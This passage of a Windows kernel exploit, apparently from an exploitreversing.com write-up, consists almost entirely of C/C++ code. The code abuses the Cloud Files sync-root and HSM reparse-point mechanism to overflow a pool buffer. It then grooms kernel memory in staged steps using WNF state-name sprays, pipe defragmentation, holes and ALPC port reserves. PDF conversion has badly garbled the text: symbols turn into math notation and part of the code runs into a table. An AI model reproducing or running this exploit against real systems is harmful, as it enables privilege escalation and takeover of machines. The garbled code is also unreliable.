static BOOL InitializeSyncRoot(void) { PWSTR appDataPath $=$ NULL; HRESULT hr $=$ SHGetKnownFolderPath(FOLDERID\_RoamingAppData, 0, NULL, &appDataPath); if (FAILED(hr)) { printf("\[-\] Failed to get AppData path\\n"); return FALSE; } swprintf(g\_syncRootPath, MAX\_PATH, L"%s\\MySyncRoot", appDataPath); CreateDirectoryW(g\_syncRootPath, NULL); swprintf(g\_filePath, MAX\_PATH, L"%s\\trigger\_first", g\_syncRootPath); swprintf(g\_filePath\_second, MAX\_PATH, L"%s\\trigger\_second", g\_syncRootPath); CF\_SYNC\_REGISTRATION registration $=$ {}; registration.StructSize $=$ sizeof(registration); registration.ProviderName $=$ L"ExploitProvider"; registration.ProviderVersion $=$ L"1.0"; registration.ProviderId $=$ ProviderId; LPCWSTR identity $=$ L"ExploitIdentity"; registration.SyncRootIdentity $=$ identity; registration.SyncRootIdentityLength $=$ (DWORD)(wcslen(identity) $\\star$ sizeof(WCHAR)); CF\_SYNC\_POLICIES policies $=$ {}; policies.StructSize $=$ sizeof(policies); policies.Hydration.Primary $=$ CF\_HYDRATION\_POLICY\_FULL; policies.Population.Primary $=$ CF\_POPULATION\_POLICY\_PARTIAL; policies.HardLink $=$ CF\_HARDLINK\_POLICY\_ALLOWED; policies.PlaceholderManagement $=$\
\
CF\_PLACEHOLDER\_MANAGEMENT\_POLICY\_UPDATE\_UNRESTRICTED; hr $=$ CfRegisterSyncRoot(g\_syncRootPath, &registration, &policies, CF\_REGISTER\_FLAG\_DISABLE\_ON\_DEMAND\_POPULATION\_ON\_ROOT); if (FAILED(hr)) { printf("\[-\] Sync root registration failed: 0x%08lX\\n", (unsigned long)hr); CoTaskMemFree(appDataPath); return FALSE; } printf("\[+\] Sync root registered: %ls\\n", g\_syncRootPath); CoTaskMemFree(appDataPath); return TRUE;\
\
}\
\
typedef enum \_HSM\_ELEMENT\_OFFSETS { ELEM\_TYPE $=$ $\\Theta \\times \\Theta \\Theta$ , ELEM\_LENGTH $=$ $\\Theta \\times \\Theta 2$ , ELEM\_OFFSET $=$ $\\Theta \\times \\Theta 4$ ,\
\
} HSM\_ELEMENT\_OFFSETS;\
\
typedef enum \_HSM\_FERP\_OFFSETS { FERP\_VERSION $=$ $\\Theta \\times \\Theta \\Theta$ , FERP\_STRUCT\_SIZE $=$ $\\Theta \\times \\Theta 2$ , FERP\_MAGIC $=$ $\\Theta \\times \\Theta 4$ , FERP\_CRC $=$ $\\Theta \\times \\Theta 8$ , FERP\_LENGTH $=$ $\\Theta \\times \\Theta \ C$ , FERP\_FLAGS $=$ $\\Theta \\times \\bot \\Theta$ , FERP\_MAX\_ELEMS $=$ $\\Theta \\times \\bot 2$\
\
} HSM\_FERP\_OFFSETS;\
\
typedef enum \_HSM\_BTRP\_OFFSETS { BTRP\_MAGIC $=$ $\\Theta \\times \\Theta 4$ , BTRP\_CRC $=$ $\\Theta \\times \\Theta 8$ , BTRP\_LENGTH $=$ $\\Theta \\times \\Theta \ C$ , BTRP\_FLAGS $=$ $\\Theta \\times \\bot \\Theta$ , BTRP\_MAX\_ELEMS $=$ $\\Theta \\times \\bot 2$\
\
} HSM\_BTRP\_OFFSETS;\
\
static USHORT BtRpBuildBuffer(HSM\_ELEMENT\_INFO\* elements, char\*\* input\_data, int count,\
\
char $\\star$ btrp\_data\_buffer) { memset(btrp\_data\_buffer, 0, BTRP\_BUFFER\_SIZE); $\\star ( { \\sf U L O N G } \\star )$ )(btrp\_data\_buffer $^ +$ BTRP\_MAGIC) $=$ HSM\_BITMAP\_MAGIC; $\\star ( \\mathsf { U S H O R T } \\star )$ )(btrp\_data\_buffer $^ +$ BTRP\_MAX\_ELEMS) $=$ (USHORT)count; char $\\star$ ptr $=$ btrp\_data\_buffer $^ +$ HSM\_HEADER\_SIZE; for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; i++) { $\\star \\left( \\mathsf { U S H O R T } \\star \\right)$ )(ptr $^ +$ ELEM\_TYPE) $=$ elements\[i\].Type; $\\star \\left( \\mathsf { U S H O R T } \\star \\right)$ )(ptr $^ +$ ELEM\_LENGTH) $=$ elements\[i\].Length; $\\star ( { \\sf U L O N G } \\star )$ )(ptr $^ +$ ELEM\_OFFSET) $=$ elements\[i\].Offset; memcpy(btrp\_data\_buffer $^ +$ elements\[i\].Offset + 4, input\_data\[i\],\
\
elements\[i\].Length); ptr $+ =$ sizeof(HSM\_ELEMENT\_INFO); } USHORT max\_offset $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; $\\dot { 7 } + +$ ) { USHORT end $=$ (USHORT)(elements\[i\].Offset $^ +$ elements\[i\].Length); if (end $>$ max\_offset) max\_offset $=$ end; } USHORT total $=$ (USHORT)(max\_offset + 4); $\\star ( \\mathsf { U S H O R T } \\star )$ )(btrp\_data\_buffer $^ +$ BTRP\_LENGTH) $=$ total; $\\star ( \\mathsf { U S H O R T } \\star )$ )(btrp\_data\_buffer $^ +$ BTRP\_FLAGS) $=$ HSM\_DATA\_HAVE\_CRC; if (total $< = ~ 8 + 0 \\times 0 . 5$ ) return 0; ULONG crc $=$ Calculate\_CRC32(0, btrp\_data\_buffer $^ +$ BTRP\_LENGTH, (ULONG)(total - 8)); $\\star ( { \\sf U L O N G } \\star )$ )(btrp\_data\_buffer $^ +$ BTRP\_CRC) $=$ crc;\
\
return total; }\
\
static USHORT FeRpBuildBuffer(HSM\_ELEMENT\_INFO $\\star$ elements, char\*\* input\_data, int count,\
\
char $\\star$ ferp\_ptr, USHORT max\_elements) { memset(ferp\_ptr, 0, FERP\_BUFFER\_SIZE); \*(USHORT $\\star$ )(ferp\_ptr $^ +$ FERP\_VERSION) $=$ VERSION\_VALUE; \*(ULONG\*)(ferp\_ptr $^ +$ FERP\_MAGIC) $=$ HSM\_FILE\_MAGIC; \*(USHORT\*)(ferp\_ptr $^ +$ FERP\_FLAGS) $=$ HSM\_DATA\_HAVE\_CRC; \*(USHORT\*)(ferp\_ptr $^ +$ FERP\_MAX\_ELEMS) $=$ max\_elements; char\* descPtr $=$ ferp\_ptr $^ +$ HSM\_HEADER\_SIZE; for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; $\\dot { 7 } + +$ ) { $\\star ( \\mathsf { U S H O R T } \\star )$ )(descPtr $^ +$ ELEM\_TYPE) $=$ elements\[i\].Type; $\\star \\left( \\mathsf { U S H O R T } \\star \\right)$ (descPtr $^ +$ ELEM\_LENGTH) $=$ elements\[i\].Length; $\\star ( { \\sf U L O N G } \\star )$ )(descPtr $^ +$ ELEM\_OFFSET) $=$ elements\[i\].Offset; memcpy(ferp\_ptr $^ +$ elements\[i\].Offset, input\_data\[i\], elements\[i\].Length); descPtr $+ =$ HSM\_ELEMENT\_INFO\_SIZE; } USHORT position\_limit $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; $\\dot { 7 } + +$ ) { USHORT end $=$ (USHORT)(elements\[i\].Offset $^ +$ elements\[i\].Length); if (end $>$ position\_limit) position\_limit $=$ end; } USHORT rem $=$ (USHORT)(position\_limit % FERP\_ALIGN); if (rem ! $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ) position\_limit $=$ (USHORT)(position\_limit $^ +$ (FERP\_ALIGN - rem)); $\\star ( { \\sf U L O N G } \\star )$ (ferp\_ptr $^ +$ FERP\_LENGTH) $=$ (ULONG)(position\_limit - 4); if (position\_limit $< =$ HSM\_ELEMENT\_TYPE\_MAX) return 0; ULONG crc $=$ Calculate\_CRC32(0, ferp\_ptr $^ +$ FERP\_LENGTH, (ULONG)(position\_limit - 8 -\
\
4)); $\\star ( { \\sf U L O N G } \\star )$ )(ferp\_ptr $^ +$ FERP\_CRC) $=$ crc; \*(USHORT $\\star$ )(ferp\_ptr $^ +$ FERP\_STRUCT\_SIZE) $=$ position\_limit; return position\_limit;\
\
}\
\
static unsigned long FeRpCompressBuffer(char\* input\_buffer, unsigned short input\_size,\
\
char\* output\_buffer) { HMODULE hNtdll $=$ GetModuleHandleW(L"ntdll.dll"); if (!hNtdll) return 0; auto fnGetWorkSpaceSize $=$ (PRtlGetCompressionWorkSpaceSize)GetProcAddress(hNtdll,\
\
"RtlGetCompressionWorkSpaceSize"); auto fnCompressBuffer $=$ (PRtlCompressBuffer)GetProcAddress(hNtdll,\
\
"RtlCompressBuffer"); if (!fnGetWorkSpaceSize \|\| !fnCompressBuffer) return 0; ULONG workSpaceSize $=$ 0, fragWorkSpaceSize $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; if (fnGetWorkSpaceSize(2, &workSpaceSize, &fragWorkSpaceSize) != 0) return 0; std::unique\_ptr<char\[\]> workspace(new char\[workSpaceSize\]);\
\
ULONG compressedSize $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;\
\
if (fnCompressBuffer(2, (PUCHAR)(input\_buffer + 4), (ULONG)(input\_size - 4), (PUCHAR)output\_buffer, FERP\_BUFFER\_SIZE, FERP\_BUFFER\_SIZE, &compressedSize, workspace.get()) ! $\\downarrow = \\textup { \\textsf { O } }$ ) return 0; return compressedSize; } static int BuildAndSetReparsePoint(HANDLE hFile, int payload\_size, char\* payload\_buf) { const int COUNT $=$ ELEMENT\_NUMBER; auto bt\_elements $=$ std::make\_unique<HSM\_ELEMENT\_INFO\[\] $>$ (COUNT); bt\_elements\[0\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE; bt\_elements\[0\].Length $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\circledcirc \\times \\mathrm { 1 } } \\end{array}$ ; bt\_elements\[1\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE; bt\_elements\[1\].Length = $\\Theta \\times 1$ ; bt\_elements\[2\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE; bt\_elements\[2\].Length = $\\Theta \\times 1$ ; bt\_elements\[3\].Type $=$ HSM\_ELEMENT\_TYPE\_UINT64; bt\_elements\[3\].Length = 0x8; bt\_elements\[4\].Type $=$ HSM\_ELEMENT\_TYPE\_BITMAP; bt\_elements\[4\].Length $=$ (USHORT)payload\_size; bt\_elements\[0\].Offset $=$ ELEMENT\_START\_OFFSET; bt\_elements\[1\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 4$ ; bt\_elements\[2\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 8$ ; bt\_elements\[3\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta \ C$ ; bt\_elements\[4\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\bot 8$ ; std::unique\_ptr<char\[\]> bt\_buf(new char\[BTRP\_BUFFER\_SIZE\]); BYTE bt\_data\_00 $=$ $\\Theta \\times \\Theta 1$ , bt\_data\_01 = $\\Theta \\times \\bot \\Theta$ , bt\_data\_02 = $\\Theta \\times \\Theta \\Theta$ ; UINT64 bt\_data\_03 = $\\Theta \\times \\Theta$ ; char\* bt\_data\[COUNT\] $=$ { (char\*)&bt\_data\_00, (char\*)&bt\_data\_01, (char\*)&bt\_data\_02, (char $\\star$ )&bt\_data\_03, payload\_buf }; USHORT bt\_size $=$ BtRpBuildBuffer(bt\_elements.get(), bt\_data, COUNT, bt\_buf.get()); if (bt\_size $\\begin{array} { r l } { \\mathrm { ~ ~ \\omega ~ } } & { { } = \\mathrm { ~ ~ \\omega ~ } \\odot } \\end{array}$ ) return $^ { - 1 }$ ; auto fe\_elements $=$ std::make\_unique<HSM\_ELEMENT\_INFO\[\] $>$ (COUNT); fe\_elements\[0\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE; fe\_elements\[0\].Length $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\circledcirc \\times \\mathrm { 1 } } \\end{array}$ ; fe\_elements\[1\].Type $=$ HSM\_ELEMENT\_TYPE\_UINT32; fe\_elements\[1\].Length = $\\Theta \\times 4$ ; fe\_elements\[2\].Type $=$ HSM\_ELEMENT\_TYPE\_UINT64; fe\_elements\[2\].Length = $\\Theta \\times \\Theta$ ; fe\_elements\[3\].Type $=$ HSM\_ELEMENT\_TYPE\_BITMAP; fe\_elements\[3\].Length $=$ $\\Theta \\times 4$ ; fe\_elements\[4\].Type $=$ HSM\_ELEMENT\_TYPE\_BITMAP; fe\_elements\[4\].Length $=$ bt\_size; fe\_elements\[0\].Offset $=$ ELEMENT\_START\_OFFSET; fe\_elements\[1\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 4$ ; fe\_elements\[2\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 8$ ; fe\_elements\[3\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta \ C$ ; fe\_elements\[4\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\bot 8$ ; std::unique\_ptr<char\[\]> fe\_buf(new char\[FERP\_BUFFER\_SIZE\]); BYTE fe\_data\_00 $=$ $\\Theta \\times 7 4$ ; UINT32 fe\_data\_01 $=$ 0x00000001; UINT64 fe\_data\_02 = $\\Theta \\times \\Theta$ ; UINT32 fe\_data\_03 $=$ $\\Theta \\times \\odot \\odot \\odot \\odot \\odot 4 \\odot$ ; char $\\star$ fe\_data\[COUNT\] $=$ { (char\*)&fe\_data\_00, (char $\\star$ )&fe\_data\_01, (char\*)&fe\_data\_02, (char\*)&fe\_data\_03, bt\_buf.get() };\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
USHORT fe\_size $=$ FeRpBuildBuffer(fe\_elements.get(), fe\_data, COUNT, fe\_buf.get(), MAX\_ELEMS);\
\
std::unique\_ptr<char $\[ \] >$ compressed(new char\[COMPRESSED\_SIZE\]); unsigned long compressed\_size $=$ FeRpCompressBuffer(fe\_buf.get(), fe\_size, ompressed.get());\
\
if (compressed\_size $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ \|\| compressed\_size $>$ COMPRESSED\_SIZE) return -1;\
\
DWORD inSize $=$ (DWORD)(offsetof(REPARSE\_DATA\_BUFFER\_EX, ReparseDataBuffer.GenericReparseBuffer.DataBuffer) $^ +$ cf\_payload\_len); DWORD bytesReturned $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;\
\
return DeviceIoControl(hFile, FSCTL\_SET\_REPARSE\_POINT\_EX, &rep\_data, inSize, NULL, 0, &bytesReturned, NULL) ? 0 : -1; }\
\
$$\
{ \\bf \ " } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\backslash \\cap \ \\mathrm { \\bf " } \\mathrm { ~ j ~ i ~ }\
$$\
\
for (int round $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; round $< 2$ ; round $^ { + + }$ ) { auto pipes $=$ std::make\_unique<PIPE\_PAIR\[\] $>$ (DEFRAG\_PIPE\_COUNT); DWORD created $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;\
\
printf("\[+\] Round %d: %lu/%lu pipes\\n", round $^ +$ 1, created, DEFRAG\_PIPE\_COUNT); }\
\
printf("\[+\] Waiting for the memory to stabilize...\\n"); Sleep(SLEEP\_NORMAL); printf("\[+\] Stage 01 COMPLETE\\n"); return TRUE;\
\
}\
\
//==\
\
// STAGE 02: WNF SPRAY\
\
//=========\
\
static BOOL Stage02\_WnfSpray(void) { printf $( " ~ \\backslash ~ \\backslash \\neg = \\dag ~ \\backslash ~ \\dag ~ \\backslash ~ \\dag ~ \\backslash ~ \\dag ~ \\backslash ~ \\dag ~ \\backslash ~ \\dag ~ \\backslash ~ \\dag ~ \\backslash ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\dag ~ \\backslash ~ \\dag ~ \\rangle ~ ;$ printf(" STAGE 02: WNF SPRAY\\n"); printf( ${ \\mathrm { ~ \\tiny ~ " ~ } } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = < = < = < < < < < < < < < < < < < < < < < < \\Omega < \\Omega \\Omega \\Omega \\Omega \\Omega \\Omega \\Omega \\Omega \\Omega \\Omega \\Omega \\Omega \\times \\Omega \\times \\times \\times \\times \\times \\times \\times \\times \\times \\times \\times \\times \\times $ ; g\_wnf\_pad\_names $=$ std::make\_unique<WNF\_STATE\_NAME\[\]>(WNF\_PAD\_SPRAY\_COUNT); g\_wnf\_names $=$ std::make\_unique<WNF\_STATE\_NAME\[\] $>$ (WNF\_SPRAY\_COUNT); g\_wnf\_active $=$ std::make\_unique<BOOL\[\] $>$ (WNF\_SPRAY\_COUNT); memset(g\_wnf\_active.get(), 0, WNF\_SPRAY\_COUNT $\\star$ sizeof(BOOL)); PSECURITY\_DESCRIPTOR pSecurityDescriptor $=$ nullptr; ConvertStringSecurityDescriptorToSecurityDescriptorW(L"", SDDL\_REVISION\_1,\
\
&pSecurityDescriptor, nullptr); auto wnf\_data $=$ std::make\_unique<BYTE\[\] $>$ (WNF\_DATA\_SIZE); memset(wnf\_data.get(), $\\Theta \\times 5 1$ , WNF\_DATA\_SIZE); DWORD padCreated $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ WNF\_PAD\_SPRAY\_COUNT; i++) { if (g\_NtCreateWnfStateName(&g\_wnf\_pad\_names\[i\], WnfTemporaryStateName,\
\
WnfDataScopeUser, FALSE, NULL, $\\Theta \\times 1 \\Theta \\Theta \\Theta$ , pSecurityDescriptor) $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ) padCreated++; } printf("\[+\] Created %lu padding WNF names\\n", padCreated); DWORD actualCreated $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ WNF\_SPRAY\_COUNT; $\\dot { 7 } + +$ ) { if (g\_NtCreateWnfStateName(&g\_wnf\_names\[i\], WnfTemporaryStateName,\
\
WnfDataScopeUser, FALSE, NULL, $\\Theta \\times 1 \\Theta \\Theta \\Theta$ , pSecurityDescriptor) $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ) actualCreated $^ { + + }$ ; } printf("\[+\] Created %lu actual WNF names\\n", actualCreated); for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ WNF\_PAD\_SPRAY\_COUNT; i++) g\_NtUpdateWnfStateData(&g\_wnf\_pad\_names\[i\], wnf\_data.get(), WNF\_DATA\_SIZE,\
\
NULL, NULL, 0, 0); Sleep(SLEEP\_NORMAL); DWORD actualUpdated $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ WNF\_SPRAY\_COUNT; i++) {\
\
if (g\_NtUpdateWnfStateData(&g\_wnf\_names\[i\], wnf\_data.get(), WNF\_DATA\_SIZE, NULL, NULL, 0, 0) $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ) { g\_wnf\_active\[i\] $=$ TRUE; actualUpdated $^ { + + }$ ; } } printf("\[+\] Updated %lu actual WNF objects\\n", actualUpdated);\
\
LocalFree(pSecurityDescriptor); printf("\[+\] Waiting for the memory to stabilize...\\n"); Sleep(SLEEP\_NORMAL); printf("\[+\] Stage 02 COMPLETE\\n"); return TRUE; }\
\
//===\
\
// STAGE 03: CREATE HOLES\
\
//===\
\
static BOOL Stage03\_CreateHoles(void) { printf("\\n======= =====\\n"); printf(" STAGE 03: CREATE HOLES\\n"); printf("======= =======\\n");\
\
DWORD deleted $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;\
\
for (DWORD i $=$ 0; i $\\angle$ WNF\_SPRAY\_COUNT; i $+ = ~ 2$ ) { if (g\_wnf\_active\[i\]) { if (g\_NtDeleteWnfStateName(&g\_wnf\_names\[i\]) $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\Theta } \\right.$ ) { g\_wnf\_active\[i\] $=$ FALSE; deleted $^ { + + }$ ; } }\
\
} printf("\[+\] Created %lu holes\\n", deleted);\
\
printf("\[+\] Waiting for the memory to stabilize...\\n");\
\
Sleep(SLEEP\_NORMAL);\
\
printf("\[+\] Stage 03 COMPLETE\\n");\
\
return TRUE;\
\
//===\
\
// STAGE 04: PLACE OVERFLOW BUFFER\
\
//==\
\
static BOOL Stage04\_PlaceOverflow(void) { printf("\\n========== ======\\n"); printf(" STAGE 04: PLACE OVERFLOW BUFFER\\n"); printf ${ \\tiny \\left( \\begin{array} { l } { 1 1 } \ { 1 } \\end{array} \\right) } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\backslash \\cap ^ { 1 } \\mid \\displaystyle \\sum \_ { i = { \\tiny \\left( i \\mathrm { ~ \\sum ~ } \\alpha \\right) } }$ SetFileAttributesW(g\_filePath, FILE\_ATTRIBUTE\_NORMAL); DeleteFileW(g\_filePath); HANDLE hFile $=$ CreateFileW(g\_filePath, GENERIC\_ALL, FILE\_SHARE\_READ \| FILE\_SHARE\_WRITE \| FILE\_SHARE\_DELETE, NULL, CREATE\_NEW, FILE\_ATTRIBUTE\_NORMAL, NULL);\
\
if (hFile $= =$ INVALID\_HANDLE\_VALUE) { printf("\[-\] Failed to create file: %lu\\n", GetLastError()); return FALSE;\
\
} std::unique\_ptr<char\[\]> payload(new char\[REPARSE\_DATA\_SIZE\]);\
\
memset(payload.get(), PAYLOAD\_FILL\_BYTE, $\\Theta \\times 1 0 0 0 ,$ );\
\
memset(payload.get() $^ +$ $\\Theta \\times 1 \\Theta \\Theta \\Theta$ , 0, REPARSE\_DATA\_SIZE - $\\Theta \\times 1 \\Theta \\Theta \\Theta$ ); \*(ULONG\*)(payload.get() $^ +$ PAYLOAD\_OFFSET + $\\Theta \\times \\Theta \\Theta$ ) = $\\Theta \\times \\odot \\odot \\odot \\odot \\odot \\odot 4$ ;\
\
$\\star ( { \\sf U L O N G } \\star )$ (payload.get() $^ +$ PAYLOAD\_OFFSET + $\\Theta \\times \\Theta 4 ^ { \\cdot }$ ) = $\\Theta \\times \\odot \\odot \\odot \\odot \\mathsf { F } \\mathsf { F } \\otimes$ ;\
\
$\\star ( { \\sf U L O N G } \\star )$ (payload.get() $^ +$ PAYLOAD\_OFFSET + $\\Theta \\times \\Theta \ 8 $ ) = $\\Theta \\times \\odot \\odot \\odot \\odot \\mathsf { F } \\mathsf { F } \\otimes$ ;\
\
$\\star ( { \\mathsf { U L O N G } } { \\star }$ )(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta \ C$ ) $=$ CHANGE\_STAMP\_FIRST; int rc $=$ BuildAndSetReparsePoint(hFile, PAYLOAD\_SIZE\_OVERFLOW, payload.get());\
\
CloseHandle(hFile);\
\
if ${ \\mathsf { \\Gamma } } \_ { \\mathsf { r } } \\subset { \\mathsf { \\Gamma } } : = { \\mathsf { \\Gamma } } \\odot ,$ ) { printf("\[-\] Failed to set reparse point\\n"); return FALSE;\
\
} printf("\[+\] Reparse point set (ChangeStamp $=$ 0x%04X)\\n", CHANGE\_STAMP\_FIRST);\
\
printf("\[+\] Stage 04 COMPLETE\\n");\
\
return TRUE;\
\
//==\
\
// STAGE 05: ALPC PORTS\
\
//==\
\
static BOOL Stage05\_AlpcPorts(void) { printf("\\n========= ${ } ^ { 1 1 } \\setminus \\bigcup \\neg = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\setminus \\cap ^ { 1 1 } .$ printf(" STAGE 05: ALPC PORTS\\n"); printf("======= ${ \\binom { 1 1 } { 1 } } = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \\backslash \\cap { \\binom { 1 1 } { 1 1 } }$ ;\
\
g\_alpc\_ports $=$ std::make\_unique<HANDLE\[\] $>$ (ALPC\_PORT\_COUNT);\
\
memset(g\_alpc\_ports.get(), 0, ALPC\_PORT\_COUNT $\\star$ sizeof(HANDLE));\
\
DWORD created $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;\
\
for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ ALPC\_PORT\_COUNT; $\\dot { 7 } + +$ ) { ALPC\_PORT\_ATTRIBUTES portAttr $= { }$ ; portAttr.MaxMessageLength $=$ $\\Theta \\times 5 \\Theta \\Theta$ ; OBJECT\_ATTRIBUTES objAttr $=$ {}; objAttr.Length $=$ sizeof(OBJECT\_ATTRIBUTES); if (g\_NtAlpcCreatePort(&g\_alpc\_ports\[i\], &objAttr, &portAttr) $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ) created++;\
\
else g\_alpc\_ports\[i\] $=$ NULL; printf("\[+\] Created %lu ALPC ports\\n", created);\
\
printf("\[+\] Waiting for the memory to stabilize...\\n");\
\
Sleep(SLEEP\_NORMAL);\
\
printf("\[+\] Stage 05 COMPLETE\\n");\
\
return (created $> =$ ALPC\_PORT\_COUNT / 2);\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
|     |     |\
| --- | --- |\
| // STAGE 06: TRIGGER OVERFLOW |  |\
| printf("\\n= | static BOoL Stage06\_TriggerOverflow(void) { =\\n"); |\
| printf(" | STAGE 06: TRIGGER OVERFLOW\\n"); |\
|  | HANDLE hFile = CreateFileW(g\_filePath, GENERIC\_READ, FILE\_SHARE\_READ \| FILE\_SHARE\_WRITE \| FILE\_SHARE\_DELETE, |\
|  | NULL, OPEN\_EXISTING, FILE\_ATTRIBUTE\_NORMAL, NULL); |\
| return FALSE; | if (hFile == INVALID\_HANDLE\_VALUE) { printf("\[-\] Failed to open file: %lu\\n", GetLastError()); |\
| } |  |\
| CloseHandle(hFile); | printf("\[+\] Overflow triggered (0x1010 bytes into 0x1000 buffer)\\n"); printf("\[+\] Waiting for the memory to stabilize... \\n"); |\
| Sleep(SLEEP\_NORMAL); printf("\[+\] Stage 06 COMPLETE\\n"); return TRUE; |  |\
| } |  |\
| //== | // STAGE 07: ALPC RESERVES |\
| printf("\\n= | static BOoL Stage07\_AlpcReserves(void) { \\n"); |\
| printf(" printf("== | STAGE 07: ALPC RESERVES\\n"); ==\\n"); |\
| DWORD totalReserves = 0; |  |\
|  | g\_saved\_reserve\_handle = NULL; |\
|  | for (DWORD i = 0; i < ALPC\_PORT\_COUNT; i++) { if (g\_alpc\_ports\[i\] == NULL) continue; |\
|  | for (DWORD j = 0; j < ALPC\_RESERVES\_PER\_PORT; j++) { |\
|  | HANDLE hResourCe = NULL; |\
| ) { | if (g\_NtAlpcCreateResourceReserve(g\_alpc\_ports\[i\], 0, 0x28, &hResource) = |\
|  | totalReserves++; |\
|  | if (g\_saved\_reserve\_handle == NULL) { |\
|  | g\_saved\_reserve\_handle = hResource; } |\
| } |  |\
| } |  |\
| } |  |\
|  |  |\
|  |  |\
|  |  |\
|  | printf("\[+\] Created %lu total reserves\\n", totalReserves); |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
|  |  |\
